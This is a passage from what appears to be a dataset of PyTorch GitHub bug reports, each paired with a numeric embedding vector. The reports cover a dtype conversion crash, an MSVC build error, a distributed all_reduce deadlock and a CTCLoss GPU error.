  1.31946951e-02  2.35344648e-01 -1.43322527e-01  2.19073258e-02
  5.77116609e-02 -1.60806939e-01  1.60307318e-01  1.42019242e-01
 -1.19620666e-01  6.45169057e-03 -2.22813904e-01  2.81247884e-01
  2.58507729e-01  2.23346874e-01 -2.04448104e-01 -1.51975930e-01
 -4.08294387e-02  3.40960443e-01 -1.46671683e-01  1.23545632e-01
  8.37110877e-02 -3.99680376e-01 -2.55603433e-01 -2.56852746e-01
  9.49994773e-02  2.48816311e-02  6.23960868e-02 -2.29114205e-01
  3.57003272e-01  1.25194728e-01  4.88976464e-02  2.45044939e-02
  2.42692411e-01 -1.67646110e-01  9.27445889e-02 -1.38469905e-01
  2.45451450e-01  1.71524689e-01  7.27484077e-02 -2.00264394e-01
 -1.63776949e-02  2.69524939e-02  1.64619356e-01  1.84695408e-01
  2.65893668e-01 -3.08881640e-01  7.63618276e-02 -1.26557812e-01
  1.02376536e-01  2.63967097e-01 -1.94295108e-01 -7.80048082e-03
 -1.58551633e-01  3.17472458e-01  2.15518996e-02  1.84713155e-01
 -2.80932218e-01 -1.90396607e-02  1.98609829e-02  2.38487236e-02
  6.17737360e-02 -9.27951634e-02 -2.49782860e-01 -1.92360789e-01
 -2.92142034e-01 -2.12823823e-02  3.27573448e-01  4.19968627e-02
 -5.09830154e-02  2.03526784e-02 -1.94478780e-04 -6.29348457e-02
 -3.18562806e-01  2.00856507e-01  4.40005958e-02  2.64376163e-01
 -3.10519010e-01 -4.25298989e-01 -2.68516660e-01 -3.29634905e-01
 -2.40585208e-01 -1.15840480e-01 -6.74362332e-02  2.06440374e-01
  1.48085505e-01 -1.50660172e-01  1.10037595e-01  3.66887264e-02
 -9.06137154e-02  1.26018927e-01 -1.79894179e-01  1.75165042e-01
 -2.72058807e-02  1.71131879e-01  5.75358607e-03 -1.89561322e-02
 -3.91608417e-01 -2.11958066e-01 -5.58878332e-02 -2.50075847e-01
 -4.56212275e-02  2.56744120e-03  2.33225405e-01  8.73962417e-02
 -7.74610788e-02  3.10504317e-01 -2.76421845e-01  7.90008251e-03
 -1.04610138e-02  2.75641643e-02  1.40618496e-02 -3.28312933e-01
  1.47201717e-01  3.20832469e-02 -1.94047354e-02  2.94918679e-02
 -2.48438597e-01  5.02126813e-02 -1.92548171e-01 -2.83519831e-02]"
Type conversion from float64 to float32 (cpu) sometimes crashes high priority triaged,"```python
import torch

a = torch.rand(3, 3, dtype = torch.float64)
print(a.dtype, a.device) # torch.float64 cpu
c = a.to(torch.float32)
#works

b = torch.load('bug.pt')
print(b.dtype, b.device) # torch.float64 cpu
c = b.to(torch.float32)
# RuntimeError: expected scalar type Float but found Double

d = b.clone().to(torch.float32)
# works
```

[bug.zip](https://github.com/pytorch/pytorch/files/3202664/bug.zip)
",True,"[-3.11374485e-01 -1.17432088e-01 -5.34452200e-01  1.24952853e-01
 -3.35173190e-01 -4.06432003e-01 -2.48751253e-01  2.46050656e-01
 -3.89823496e-01  1.43988319e-02 -3.46699059e-01 -9.62818265e-02
 -1.79730713e-01  1.45699680e-01  5.83038442e-02 -3.58207077e-02
 -1.45877749e-01 -1.34911478e-01  3.06385588e-02 -2.22626608e-02
  1.30003929e-01  7.57221803e-02 -1.51148379e-01  9.64977592e-02
 -2.81242877e-02  2.11309895e-01 -6.18226975e-02 -2.08832882e-02
  2.42648393e-01  6.66630119e-02 -2.12144166e-01 -3.09986889e-01
  2.46431157e-02  1.55788094e-01  3.81343454e-01  7.75720775e-02
 -4.23034541e-02 -1.81773782e-01 -3.43736768e-01 -1.03679031e-01
  1.73797071e-01  3.92158985e-01  1.67716086e-01 -1.23568200e-01
  1.77643001e-01  2.29724765e-01 -1.18620202e-01  3.31653923e-01
 -6.01869524e-02 -2.35923201e-01 -1.15819797e-01  1.58039510e-01
 -6.59683794e-02  3.27392481e-04 -1.53499424e-01 -3.28705788e-01
  1.09163880e-01 -1.16437837e-01  3.88546363e-02 -4.15684998e-01
 -1.55823067e-01 -1.09357566e-01  3.13523054e-01 -2.49176174e-01
  1.84443444e-01  1.44897839e-02  4.97267172e-02  9.49361399e-02
  3.29879761e-01 -3.73152584e-01  6.45131990e-02 -1.97531600e-02
 -1.48376063e-01  1.52586222e-01  3.72854844e-02 -1.54112116e-01
 -2.03757063e-01  5.33735678e-02 -1.74740791e-01 -1.60468876e-01
 -1.96171805e-01 -2.86393344e-01 -1.43312477e-03 -1.56439632e-01
  1.62002832e-01 -2.37647802e-01  4.78993982e-01 -6.86755031e-02
  3.20413321e-01  2.64657557e-01  1.90010965e-01  4.01368856e-01
 -7.25102872e-02  2.54636645e-01 -4.41350728e-01 -7.39977360e-02
  4.33304071e-01 -4.26588893e-01  1.41114220e-01 -2.11341083e-01
 -5.09102345e-02 -7.15403616e-01 -9.89328325e-02  1.02137372e-01
  2.50601858e-01 -1.79373831e-01  1.91075236e-01  4.09113228e-01
  2.69736499e-01 -3.39016430e-02  3.62082899e-01  6.23469874e-02
 -4.74677160e-02 -2.02509075e-01 -2.40869358e-01  2.35797957e-01
 -3.09093356e-01 -2.73466296e-02 -1.72589749e-01  1.54647619e-01
 -1.08998008e-01  1.20032743e-01 -6.93053454e-02  3.53795230e-01
  3.29753518e-01 -1.74062729e-01 -2.00797513e-01 -9.93316174e-02
 -1.52751952e-01 -5.15025966e-02  6.76722378e-02 -2.65686102e-02
 -1.15388125e-01 -1.35456681e-01  4.39202547e-01  2.58958042e-01
 -1.23526022e-01 -3.44906271e-01 -1.98399559e-01 -4.29039031e-01
  1.95762053e-01  2.23290473e-02 -3.71367753e-01 -5.37132621e-01
  2.42414609e-01  1.26024932e-01 -3.13462377e-01  1.86876878e-01
  1.74295813e-01  2.69868970e-01  2.66985595e-01  1.06072545e-01
 -4.40330237e-01  3.09933901e-01 -2.36716464e-01 -1.09697789e-01
  4.58611310e-01  5.03605455e-02  1.59516409e-01 -2.20354676e-01
 -3.22923698e-02  3.00433010e-01  5.30383289e-01 -1.24200709e-01
  2.73504347e-01  6.73355609e-02 -1.89206794e-01  1.97460085e-01
 -5.18896818e-01  4.32579428e-01  3.85189541e-02 -5.30270822e-02
 -1.59319580e-01 -7.53709227e-02  7.23270476e-02  1.96625032e-02
  1.00344606e-01 -3.70949835e-01 -1.89371020e-01  6.18304908e-02
  6.23369575e-01  5.19575834e-01  3.56229484e-01  3.91418785e-02
  3.20300937e-01 -1.93419829e-01  3.63888919e-01 -2.46311545e-01
 -3.96613106e-02  4.99671623e-02 -3.23974371e-01 -2.93443859e-01
 -1.00423582e-02 -3.91860306e-02 -1.22026421e-01  8.77815485e-02
 -1.98027402e-01 -6.10966608e-02  2.09109664e-01 -1.72404796e-01
  1.33458972e-01  3.82785164e-02  1.18107796e-01  5.83438799e-02
  1.29900485e-01 -1.59928054e-01 -1.99010640e-01 -5.45703232e-01
 -4.82309461e-02  4.42661256e-01 -3.92036974e-01 -4.08064306e-01
 -2.74196506e-01 -9.87280980e-02 -1.80195928e-01 -5.40854372e-02
  8.02295357e-02 -9.70408171e-02  3.39893531e-03  2.84277815e-02
  2.72593468e-01 -3.20950896e-01  9.45118815e-03 -2.00123712e-01
  4.44828533e-03  1.43275812e-01 -4.30187345e-01  1.01578176e-01
 -8.77399892e-02 -1.89494520e-01 -4.13558632e-03 -3.92272621e-01
  3.20040971e-01  4.40791585e-02  1.49389893e-01  8.06076974e-02
 -5.56103885e-01  9.87725258e-02 -2.27084845e-01  6.20827451e-02
  8.85924548e-02  1.20902412e-01  1.75727889e-01 -1.86949104e-01
 -1.96907133e-01 -8.23636651e-02 -5.59167452e-02  1.47314155e-02
 -1.60120606e-01  1.41124316e-02 -2.38059849e-01  2.64060497e-01
  3.06839168e-01 -8.62958804e-02  3.15686792e-01  1.79259077e-01
  1.61146373e-01 -1.20450489e-01 -5.46428934e-02 -2.87558705e-01
  1.38943180e-01  3.04496527e-01  1.07774235e-01  2.21865922e-01
  3.33616249e-02 -2.90135555e-02 -1.81869298e-01  5.40333092e-01
  2.31078684e-01  1.26745716e-01  2.57147163e-01  5.78032508e-02
  6.77743673e-01  3.97448651e-02  2.37088904e-01 -6.00169778e-01
  2.66691566e-01  3.46585810e-02 -5.72629496e-02 -2.76165694e-01
  1.14682049e-01  3.09007198e-01 -2.17554674e-01  7.31538385e-02
  1.15090959e-01 -3.36263448e-01  2.73536533e-01 -2.50472546e-01
 -2.21874207e-01  6.53384477e-02  6.71943650e-03 -8.83666202e-02
  1.74735323e-01 -1.86297506e-01 -4.52327073e-01  3.46217081e-02
  3.61083448e-01 -1.45996228e-01 -1.37265295e-01 -9.55533832e-02
 -4.12000604e-02  2.76945293e-01  4.32119757e-01  9.77902114e-03
 -2.68185288e-02 -2.55153924e-02  2.23023713e-01  3.16670150e-01
  5.11940837e-01 -3.39431018e-01  5.80371618e-02 -2.74470329e-01
 -4.66907799e-01  1.11239731e-01 -1.80742249e-01  2.80602872e-01
  1.20871790e-01  2.04890892e-01  1.31812245e-01 -9.66065452e-02
 -2.12340117e-01 -2.66704321e-01 -3.60050321e-01  2.37844974e-01
  4.34170887e-02  1.12404838e-01  5.85261732e-03 -1.99850261e-01
  2.56295532e-01 -2.56478131e-01 -1.87811911e-01 -8.40559229e-03
  2.30454534e-01 -1.53580815e-01 -7.28849508e-03 -3.31532896e-01
 -3.49199660e-02  1.11538716e-01 -5.88647276e-02 -7.99296945e-02
 -5.97558692e-02 -1.23291828e-01 -2.10137591e-02 -3.63482803e-01
  5.12289703e-02 -1.03635415e-02  5.05391121e-01  2.21470073e-01
  4.64818114e-03 -1.38517633e-01 -1.20708652e-01  1.64487101e-02
  8.92255604e-02  3.17561477e-01  2.66664237e-01  1.18158162e-01
 -2.08394714e-02  2.12683037e-01  1.98125184e-01  4.54133332e-01
 -5.05249016e-02  4.69112217e-01 -6.51561856e-01 -2.06050739e-01
  2.21665367e-01 -2.33858973e-01 -1.91382676e-01  3.98439616e-02
  3.65069360e-02  3.55285585e-01 -1.26435608e-01  1.85207590e-01
  9.23395604e-02  5.90917230e-01  5.06214499e-01 -2.41758332e-01
  1.13348477e-01 -1.61923468e-01  3.44257116e-01  2.75739431e-01
  4.83819544e-01 -7.12985322e-02 -1.74873210e-02  1.40473917e-01]"
Build error with MSVC (aten\src\ATen\native\quantized\Copy.cpp) oncall: quantization triaged,"## ðŸ› Bug

```
..\aten\src\ATen\native\quantized\Copy.cpp(18): error C2065: 'src_data': undeclared identifier
..\aten\src\ATen\native\quantized\Copy.cpp(18): error C2672: 'at::quantize_val': no matching overloaded function found
..\aten\src\ATen\native\quantized\Copy.cpp(26): error C2780: 'T at::quantize_val(float,int32_t,float)': expects 3 arguments - 2 provided
```

## To Reproduce

Steps to reproduce the behavior:

```
set CMAKE_GENERATOR=""Visual Studio 16 2019"" x64

set DISTUTILS_USE_SDK=1

""C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvarsall.bat"" x64

set CMAKE_GENERATOR=Ninja

set REL_WITH_DEB_INFO=1

python setup.py install
```
",True,"[-3.69570106e-01 -2.63111025e-01 -2.37309620e-01  1.98539436e-01
  1.39624745e-01 -1.66901171e-01  1.93801731e-01  8.91443714e-02
 -5.28263509e-01 -3.38457972e-02  2.57649958e-01 -3.15027624e-01
  1.12069160e-01 -4.75379638e-02 -7.19532296e-02  2.00001925e-01
 -1.40968516e-01  1.98095649e-01 -1.32678285e-01 -6.36886209e-02
  3.38051394e-02  6.03785887e-02 -5.84359951e-02  2.16297224e-01
  3.50963891e-01 -1.23432405e-01  5.81612345e-03 -3.22216809e-01
  2.37068474e-01 -5.76568879e-02  5.93434647e-02 -3.08154821e-01
  9.98310819e-02  7.01028481e-03  4.69231904e-01  1.39497191e-01
 -1.63976308e-02  2.77479291e-02 -2.08736449e-01  3.27388346e-02
  2.34233335e-01  1.10132568e-01  6.43084347e-02 -7.69343302e-02
 -9.46791768e-02 -4.13993239e-01 -1.73199028e-01  2.36818597e-01
 -3.10187817e-01 -4.58697826e-02 -1.69255644e-01  1.52013123e-01
 -6.06744707e-01 -4.02693659e-01 -3.28118466e-02 -1.63394772e-03
 -8.28932896e-02  2.34811604e-01 -6.96726516e-02  1.47078753e-01
  2.66270638e-01 -2.86318481e-01  1.42869994e-01  4.67873327e-02
  9.11703929e-02  1.68905735e-01  6.56188792e-03 -5.71004152e-02
  3.69051665e-01 -3.46265018e-01 -7.46272504e-02  2.19256490e-01
 -4.23097134e-01  8.64455551e-02  3.59659731e-01 -8.38604420e-02
 -3.06603909e-01  2.70122260e-01  3.21908016e-03 -7.15083778e-02
  1.16165876e-01 -2.15504244e-02  1.14811823e-01 -1.89580530e-01
  2.61071976e-02  4.24640719e-03  9.83501673e-02 -2.51074135e-01
  2.39997268e-01  8.60720724e-02  4.84025300e-01 -9.24890637e-02
 -6.89660385e-03  1.37821808e-01  2.27770239e-01 -1.86057150e-01
 -1.02524132e-01  1.83322042e-01  4.61523160e-02 -3.06678653e-01
 -1.82506323e-01 -1.95363328e-01 -3.77358794e-01  3.28775585e-01
 -1.20437428e-01 -1.00941792e-01 -1.24569582e-02 -1.78528368e-01
  1.63677007e-01  1.45439893e-01  3.02146465e-01  7.64542073e-02
 -1.44225098e-02 -2.40018383e-01 -2.47947246e-01  4.70323920e-01
 -1.50483660e-02 -2.27277316e-02 -1.55567706e-01  1.87634408e-01
 -2.52076507e-01 -2.97215819e-01  2.29547620e-02  1.66525096e-01
  3.37899029e-01 -1.31131317e-02 -2.30028734e-01 -1.79223180e-01
 -1.04078781e-02 -5.75796813e-02  2.10912511e-01  8.75550210e-02
  3.27093422e-01 -2.01923728e-01  2.24470258e-01 -3.50412786e-01
 -6.33421302e-01 -4.75225419e-01 -3.51913780e-01 -1.72426149e-01
 -3.09428185e-01  2.05459163e-01 -4.47543599e-02 -2.60729417e-02
  5.73550463e-02  2.27900684e-01 -7.59788230e-02  9.23148096e-02
 -5.67063503e-03  2.37004146e-01 -1.78319197e-02  2.37257138e-01
 -4.13955241e-01  2.44849652e-01  1.07489198e-01  3.26410592e-01
  3.52738976e-01 -1.94172829e-01 -2.07050905e-01 -4.87878799e-01
  4.50994484e-02  6.40942335e-01  3.35755199e-01  1.64234415e-01
  3.07456672e-01  1.39691904e-02 -2.61184394e-01 -5.00747338e-02
 -1.72441423e-01  1.14051506e-01  4.26677428e-02 -2.63208058e-05
  8.79930779e-02 -1.03814326e-01  4.83232379e-01 -2.24824697e-02
  2.49718100e-01 -2.32163697e-01  3.19464020e-02  2.51910776e-01
  4.81674522e-01  1.14079520e-01  3.32558632e-01 -7.26189166e-02
  5.77157736e-02  1.42558485e-01  1.21721633e-01  8.18700790e-02
 -6.24342710e-02  1.81519151e-01  1.21014491e-02  1.32859156e-01
  5.37579283e-02  6.86337948e-02 -2.43627638e-01 -2.23342925e-01
  4.78839338e-01  7.62958899e-02  3.92482638e-01  2.32080594e-01
  1.45467445e-01  4.41838950e-02  3.06102872e-01  4.07473296e-02
  2.12086923e-02 -1.20854408e-01 -3.76671195e-01 -8.06300640e-02
 -4.30001169e-02  5.40766641e-02 -4.09325093e-01  3.61202657e-03
 -2.29160473e-01 -5.06322622e-01 -6.10484302e-01  3.59179616e-01
  7.09972978e-02 -5.40218651e-02  3.50206375e-01  1.11656785e-01
  2.28848204e-01  9.59668383e-02 -1.88807786e-01 -1.97989136e-01
  3.56627822e-01 -5.46807423e-02 -2.85853371e-02 -5.90269566e-02
 -3.90076816e-01 -1.96752250e-01 -4.52025160e-02  8.99517685e-02
  2.29158893e-01 -4.44234580e-01  2.53162801e-01  1.02483898e-01
  2.67765336e-02 -5.20409681e-02 -1.45278767e-01 -2.69864760e-02
 -1.84181094e-01 -4.11479846e-02 -2.26361349e-01 -2.94120133e-01
  1.06206685e-01 -1.56910241e-01  1.35532524e-02  2.02072516e-01
  7.99751207e-02  3.35592091e-01 -3.12229306e-01 -1.24695241e-01
  3.29388857e-01 -1.03536084e-01 -7.66957030e-02  2.82803684e-01
  1.04321346e-01 -1.98096097e-01 -1.44913882e-01  1.48845371e-03
  2.90866554e-01  3.64256263e-01 -1.98791981e-01  2.83026900e-02
  1.87316891e-02 -1.38443280e-02 -3.34008217e-01  1.08614340e-01
  4.64620084e-01 -7.59408697e-02  6.01721346e-01 -3.80469441e-01
 -1.48357600e-01 -1.16287153e-02  1.39308065e-01 -5.85849658e-02
  6.61288679e-01 -7.25969970e-02 -8.55051167e-03 -6.90862536e-03
  1.07721731e-01  4.44003463e-01  3.79586741e-02  1.96599841e-01
  9.92154423e-03 -3.03898394e-01  1.74122415e-02 -3.47627878e-01
 -3.06959003e-01  2.67411470e-02 -4.87431213e-02 -2.16381162e-01
 -1.39393553e-01  1.17368586e-01 -1.53616786e-01  4.97026853e-02
 -4.33147624e-02 -1.26736179e-01  8.67117047e-02 -1.55734479e-01
 -3.88009399e-01  3.22647750e-01  6.10026121e-02  1.63277239e-01
 -2.10414276e-01 -1.66816190e-01  1.57937199e-01  3.07199061e-01
  5.13410687e-01 -1.89637423e-01  2.71971345e-01  2.03129515e-01
 -1.59682259e-01  5.45660555e-01 -1.79162607e-01 -3.18358876e-02
  7.70341158e-02  4.70244765e-01  4.21147123e-02 -1.47662573e-02
 -7.08149523e-02 -4.50348049e-01 -5.75952411e-01 -1.29700869e-01
  1.96871221e-01  2.99549699e-01 -4.43343401e-01 -3.44875038e-01
  2.52658557e-02  7.96209276e-02 -1.68998003e-01  3.52022111e-01
 -1.30702779e-01  2.78779417e-01 -1.95231766e-01 -3.53763878e-01
 -2.29437470e-01  5.00692606e-01  1.60506934e-01 -3.43594372e-01
  2.21617911e-02 -4.15366925e-02 -2.71496382e-02 -9.96766835e-02
 -1.03385374e-01 -2.74199635e-01  8.30991045e-02  5.48795223e-01
  5.82152754e-02  2.16720253e-01 -1.26682073e-02  6.01877347e-02
 -1.49902955e-01 -1.42079949e-01 -2.75099725e-01  6.83851764e-02
  3.16252947e-01  1.35328785e-01  5.23571111e-02  3.53642583e-01
 -2.45218933e-01  1.36951134e-01 -2.91718483e-01 -1.23737335e-01
  1.91191912e-01 -1.92967951e-01 -2.65964657e-01 -7.59972036e-02
  1.84903130e-01  1.67956322e-01 -1.53269336e-01  2.27413684e-01
 -3.96963775e-01  5.72697744e-02  5.32674231e-03 -5.57041988e-02
 -2.74798553e-02 -3.76223288e-02  2.18371212e-01  2.43567914e-01
 -5.48146740e-02  4.12149280e-02 -1.24762028e-01 -1.44395009e-01]"
distributed all_reduce deadlocks in v1.1 oncall: distributed module: cuda triaged,"## ðŸ› Bug

I'm doing multi-node training (8 nodes, 8 gpu's each, NCCL backend) and am using `DistributedDataParallel` for syncing grads and `distributed.all_reduce()` calls to log losses. I recently upgraded from Pytorch v1.0 to v1.1 and after doing so, my training script hangs at a `distributed.all_reduce()` call. The hang doesn't occur if I downgrade pytorch to v1.0. It also hangs if I use the pytorch-nightly version.
Some observations about the deadlock that might be useful:

1. The script deadlocks exactly after the same number of training iterations (7699). Changing the model architecture changed this number, but it's still the same for different runs of the same architecture.

2. In all the runs, the hang occurs at an all_reduce of a single element gpu tensor created as follows:
```
loss = loss.item()
sum = torch.tensor(loss * batch).float().cuda() //as batch could be different on each rank
distributed.all_reduce(sum)
sum = sum.item()
```
All ranks complete line 3, but only ranks = {0,8,16,...,56} ie ranks with local_rank=0 complete line 4. I checked if different processes are accessing the same GPU, however each process is using it's corresponding gpu (set using `torch.cuda.set_device(local_rank)`, though all GPU's are visible to each process). I tried adding a `dist.barrier()` after the `all_reduce()`, or using the same tensor for sum always (instead of creating a new one), however it still hangs, and always after the same number of iterations (7699). 
3. The reduction within the DDP itself hasn't hung in any of my runs yet. I tried setting `find_unused_parameters=True`, however that didn't help.
4. I looked at NCCL debug logs using `NCCL_DEBUG_SUBSYS=COLL NCCL_DEBUG=INFO`, and no errors were thrown. The last calls corresponded to all reduce calls for a 1 element tensor. It's fewer calls than the previous iteration though. 
## To Reproduce

It takes about 7 hrs for the deadlock to happen, and it's hard for me to share the code. I'll try see if I can come up with a simpler script that reproduces the deadlock.

## Environment
```
PyTorch version: 1.1.0
Is debug build: No
CUDA used to build PyTorch: 10.0.130

OS: Ubuntu 16.04.5 LTS
GCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
CMake version: version 3.11.1

Python version: 3.6
Is CUDA available: Yes
CUDA runtime version: 10.0.130

GPU models and configuration:                                                                                                          GPU 0: Tesla V100-SXM2-16GB                                                                                                            GPU 1: Tesla V100-SXM2-16GB
GPU 2: Tesla V100-SXM2-16GB
GPU 3: Tesla V100-SXM2-16GB
GPU 4: Tesla V100-SXM2-16GB
GPU 5: Tesla V100-SXM2-16GB
GPU 6: Tesla V100-SXM2-16GB
GPU 7: Tesla V100-SXM2-16GB

Nvidia driver version: 410.79
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.1.4

Versions of relevant libraries:                                                                                                        [pip3] numpy==1.16.3                                                                                                                   [pip3] tcop-pytorch==0.0.0
[pip3] torch==1.1.0
[pip3] torchvision==0.2.2.post3
[conda] blas                      1.0                         mkl
[conda] mkl                       2019.3                      199
[conda] mkl_fft                   1.0.12           py36ha843d7b_0
[conda] mkl_random                1.0.2            py36hd81dba3_0
[conda] pytorch                   1.1.0           py3.6_cuda10.0.130_cudnn7.5.1_0    pytorch                                           [conda] tcop-pytorch              0.0.0                    pypi_0    pypi
[conda] torchvision               0.2.2.post3              pypi_0    pypi
```",True,"[-3.20981771e-01 -9.51383412e-02 -3.44297767e-01 -1.12918153e-01
 -1.08364686e-01 -1.67537570e-01 -5.81180975e-02 -5.11768982e-02
 -5.69861591e-01  3.53358127e-02 -1.04949633e-02  3.21733296e-01
  1.06539756e-01  9.75597352e-02 -2.49676421e-01  2.02036187e-01
 -2.34195516e-02  8.38781670e-02 -6.88049942e-03 -1.87692083e-02
  5.81783764e-02  7.45792091e-02 -3.42601091e-02  5.61718158e-02
 -4.03556600e-03 -1.13927759e-02 -2.08081692e-01 -3.93939972e-01
  2.09279746e-01 -6.84857666e-02 -9.59687531e-02  2.18994647e-01
 -6.88717440e-02  1.45186018e-02  1.64464749e-02  1.07376441e-01
 -1.85738623e-01 -6.42732382e-02 -7.39072040e-02 -6.05964959e-02
  7.78553784e-02  2.54936695e-01 -1.09155416e-01 -1.46273896e-01
 -1.56341106e-01 -2.95898497e-01 -2.68040836e-01  3.74774218e-01
 -1.90991253e-01 -1.64100289e-01  1.68678686e-01  3.00065398e-01
 -2.23339014e-02 -1.88608259e-01 -8.43890309e-02 -1.32723898e-01
 -8.82337913e-02  2.65193969e-01 -3.19423914e-01  1.74078643e-01
  2.47178108e-01 -1.26704350e-01  4.30955924e-02  3.42823297e-01
  4.62508574e-02  4.10442948e-01  2.78310180e-01 -7.25892037e-02
  4.79473948e-01 -1.95488781e-02 -2.66408324e-01  2.00446784e-01
 -2.39324883e-01 -6.34228736e-02  2.51470646e-03  1.47997260e-01
 -1.32983714e-01 -8.46055001e-02  2.59749502e-01  5.61436601e-02
 -7.75822327e-02  2.36687630e-01  1.10181689e-01 -2.24251285e-01
 -6.02534339e-02 -5.84019758e-02  3.03042233e-01 -2.28629619e-01
  2.09672302e-01 -9.34051499e-02  5.11424430e-03  2.57173121e-01
 -1.62371814e-01  4.61915165e-01 -2.36638963e-01  2.25110501e-01
  2.64628530e-01 -1.35371350e-02 -1.72322839e-01 -5.52969426e-02
  1.89477220e-01 -3.43640924e-01 -1.25301287e-01  3.49513143e-01
 -1.48257598e-01 -9.34701934e-02  2.84086764e-01 -1.78266708e-02
  1.34521797e-01  7.57648796e-02  1.83409318e-01  1.34551272e-01
  7.31762871e-02 -2.09682696e-02 -1.23221047e-01  2.17943370e-01
 -3.84825096e-03  2.89167054e-02 -9.90317762e-03  1.86134905e-01
  1.38006173e-02 -2.05311567e-01  2.29153000e-02  6.00789040e-02
  5.60837030e-01  9.48760659e-02  9.51870829e-02 -1.98266041e-02
  1.32345017e-02 -4.15868461e-02  6.93712309e-02  8.56876075e-02
  8.50845873e-02 -1.34090781e-01  8.29435140e-02  2.43661672e-01
 -2.33966470e-01 -2.66531408e-02 -2.44422063e-01  2.61114955e-01
 -1.03996761e-01  2.43875794e-02  2.02404171e-01 -2.55790114e-01
  1.03987651e-02  1.17239401e-01  1.18663162e-01 -1.06413089e-01
  1.99562684e-02  7.82557130e-02  6.49933144e-02 -1.50093436e-01
 -2.52883792e-01  7.04872757e-02  6.51916042e-02  2.01605827e-01
  3.25569451e-01  6.97182789e-02  4.75829095e-03 -3.36034805e-01
 -8.98662210e-02  2.98715293e-01 -2.35546812e-01 -4.54749987e-02
 -7.49920215e-03  2.13170856e-01 -1.11849412e-01 -1.17514774e-01
 -9.96229500e-02  1.17468894e-01 -6.11780956e-02 -4.52727139e-01
  9.68204811e-03 -6.99241996e-01  2.49255866e-01  2.22497940e-01
 -1.50041431e-01 -1.36592947e-02  1.55024201e-01  1.67217255e-01
 -1.64300315e-02  2.65741348e-01  8.95899832e-02 -4.45361957e-02
  1.44883424e-01  3.33748221e-01 -5.82831576e-02  2.18738094e-01
 -2.14349136e-01 -4.48572874e-01 -3.25901270e-01 -5.01655042e-04
  2.87709862e-01 -2.64191389e-01 -7.56715331e-03 -4.57117200e-01
 -4.69719917e-02 -9.51048173e-03  2.12681115e-01 -5.92890419e-02
  1.54915705e-01  1.90970138e-01 -9.21068937e-02  6.52347952e-02
 -1.31063052e-02  1.86919630e-01 -3.58065397e-01 -2.33984634e-01
  2.25105166e-01 -3.25073302e-02 -4.82967854e-01 -1.20742247e-01
 -1.66052908e-01 -4.25791085e-01 -2.64017642e-01  4.13329154e-02
  2.19733760e-01  1.55589178e-01 -4.04235497e-02  7.64227808e-02
  6.20433092e-01 -9.81446803e-02  2.23075584e-01 -2.53019929e-01
  1.37078837e-01  2.27966323e-01  2.24201813e-01  7.16808438e-02
 -1.19355217e-01 -9.40864831e-02  2.54760161e-02 -3.98064479e-02
  3.11478004e-02  1.41656801e-01  7.00174179e-03 -1.45109575e-02
  1.74967229e-01  1.04169361e-01 -3.36376309e-01  1.65567417e-02
 -1.25946045e-01 -1.32130250e-01  1.33300185e-01 -3.25445235e-01
  1.54845878e-01  3.16303819e-01 -2.08364755e-01 -2.63211131e-03
  3.52442116e-02  9.18753445e-04 -2.13585287e-01  2.43598878e-01
  7.72625804e-02 -2.99494285e-02  2.21982166e-01 -2.20900029e-03
  2.88209110e-01 -2.03516826e-01  2.74254810e-02 -2.56763458e-01
  1.28181890e-01  5.06543517e-01 -1.37483314e-01  2.78080523e-01
  2.96856582e-01 -2.16107771e-01 -5.35453081e-01  2.92597800e-01
  1.02874048e-01 -2.74073005e-01 -1.65590778e-01 -2.24742517e-01
  7.42842406e-02  1.32675171e-01 -6.06788415e-03  8.12456310e-02
  6.15731716e-01 -1.23362876e-01  2.65395105e-01  3.45874965e-01
  2.89991349e-02  1.92782074e-01 -5.78123182e-02 -4.05806638e-02
  2.53026843e-01 -2.38823444e-01 -3.18937570e-01  3.80120985e-03
 -8.91199335e-02 -1.71280831e-01 -2.07366079e-01 -6.06911406e-02
 -8.18528980e-02  1.19826719e-01 -2.09194332e-01 -4.51013073e-02
  5.98011576e-02 -1.90008253e-01  1.95916489e-01 -1.52446657e-01
 -2.54342914e-01 -3.73108476e-01 -1.07116327e-01  1.05080642e-02
 -3.06653559e-01 -3.11929941e-01  1.18491292e-01 -9.83892456e-02
  4.13448751e-01  5.54948151e-02  2.63540089e-01  4.21583265e-01
  1.51491582e-01  3.27380717e-01 -1.91507041e-01  3.84403728e-02
 -1.70564145e-01  2.72232860e-01  8.39551911e-02  9.65296291e-04
 -1.89923078e-01 -2.59803206e-01 -3.47814918e-01 -1.38124913e-01
  1.38448969e-01  1.63879678e-01 -1.17919117e-01  1.06068790e-01
 -1.11918472e-01  1.94005847e-01  6.83905929e-02  1.14249671e-02
 -5.01385480e-02  1.42026693e-01  8.79004300e-02 -1.40846193e-01
 -2.80006826e-01  1.45265400e-01  3.84523906e-03 -2.36607432e-01
 -4.53063436e-02 -1.72604203e-01 -4.82544363e-01 -7.32958466e-02
 -6.15098551e-02 -2.67096370e-01  2.56126195e-01  4.52727020e-01
  2.08039641e-01 -7.71984980e-02 -9.19121951e-02 -1.72381163e-01
 -8.54189545e-02 -6.07658699e-02 -2.64269054e-01  5.41351795e-01
  4.59208041e-01  3.48850451e-02  1.24929108e-01  3.89327824e-01
 -2.82650650e-01  2.95563698e-01 -1.35349154e-01 -7.57921040e-02
  1.06472723e-01 -8.89625251e-02 -9.63014364e-03  7.87510723e-02
  2.46600688e-01  2.46585310e-01 -3.08446288e-01  1.51264384e-01
 -7.81369135e-02 -1.15108758e-01  6.68780953e-02 -1.73943043e-01
  6.55224174e-02 -1.14692271e-01  6.14233688e-02  2.64341414e-01
 -3.90299857e-01 -9.57385004e-02  4.35636146e-03 -1.47020549e-01]"
nn.CTCLoss RuntimeError on GPU module: nn module: loss module: cuda triaged,"## ðŸ› Bug

nn.CTCLoss Run the official documentation sample code works fine on the CPU but  RuntimeError on the GPU.

## To Reproduce

```py
import torch
import torch.nn as nn
import torch.nn.functional as F

>>> T = 255      # Input sequence length
>>> C = 20      # Number of classes (excluding blank)
>>> N = 16      # Batch size
>>> S = 30      # Target sequence length of longest target in batch
>>> S_min = 10  # Minimum target length, for demonstration purposes
>>>
>>> # Initialize random batch of input vectors, for *size = (T,N,C)
>>> input = torch.randn(T, N, C).log_softmax(2).detach().requires_grad_()
>>>
>>> # Initialize random batch of targets (0 = blank, 1:C+1 = classes)
>>> target = torch.randint(low=1, high=C+1, size=(N, S), dtype=torch.long)
>>>
>>> input_lengths = torch.full(size=(N,), fill_value=T, dtype=torch.long)
